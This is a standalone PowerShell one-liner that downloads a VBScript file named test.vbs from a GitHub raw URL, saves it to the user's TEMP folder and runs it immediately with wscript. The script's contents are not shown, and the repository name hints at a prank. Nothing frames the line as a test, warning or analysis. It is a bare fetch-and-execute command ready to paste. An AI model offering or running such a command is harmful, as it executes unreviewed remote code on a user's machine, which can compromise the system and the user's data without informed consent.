(iwr "https://raw.githubusercontent.com/UnoPickle/funyliner/refs/heads/funny%2B/test.vbs").Content | Out-File -FilePath "$env:TEMP\a.vbs"; wscript "$env:TEMP\a.vbs"
